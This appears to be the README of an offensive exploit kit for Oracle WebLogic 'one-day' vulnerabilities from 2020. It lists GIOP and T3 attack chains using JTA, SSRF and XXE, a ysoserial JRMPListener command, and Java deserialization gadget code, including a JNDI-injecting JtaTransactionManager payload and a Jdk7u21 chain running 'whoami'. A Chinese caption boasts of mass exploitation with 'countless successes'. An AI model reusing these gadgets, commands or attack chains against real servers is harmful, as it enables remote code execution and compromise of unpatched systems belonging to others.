# 1、Weblogic 1day
CVE_2020_2546 CVE-2020-2915 CVE-2020-2801  CVE-2020-2798  CVE-2020-2883 CVE-2020-2884 CVE-2020-2950 WebLogic T3 payload exploit pot python3

# 2、exploit
- GIOP + send bind (CVE-2020-2555 or others)
- GIOP + send jta (rmi or others)
- GIOP + send jta + ssrf
- T3 + send jta
- T3 + send jta + ssrf
- T3 + send XXE
- T3 + send XXE + ssrf

#### 2.1、rmi server,see
- don't use org.mozilla.classfile.DefiningClassLoader
- don't use java -cp $mtx/../tools/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 Jdk7u21 'whoami'
more see:
https://github.com/hktalent/CVE-2020-2551

# 3、code
### 3.1、code n1
```
MVEL.compileExpression
MvelExtractor o = new MvelExtractor("xxx;");
		ObjectOutputStream oo = new ObjectOutputStream(System.out); 
		oo.writeObject(o);
		oo.flush();
```

### 3.2、code1
```
public MsgOutput getObject(final String command) throws Exception {
	  String jndiAddress = command;
		JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
		jtaTransactionManager.setUserTransactionName(jndiAddress);
		MsgOutput remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), MsgOutput.class);
    return remote;
  }
```

### 3.3、code2
```
public IORDelegate getObject(final String command) throws Exception {
IORDelegate ior = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", new Jdk7u21().getObject("whoami")), IORDelegate.class);
    return ior;
  }
```

# 4、CVE-2020-2546 payload
#### 批量一波，成功无数
<img width="621" alt="image" src="https://user-images.githubusercontent.com/18223385/75693161-8c550300-5ce1-11ea-9c28-3e81a6c72d28.png">


# 5、thanks for
@[r4v3zn](https://github.com/r4v3zn)
@[0nise](https://github.com/0nise)
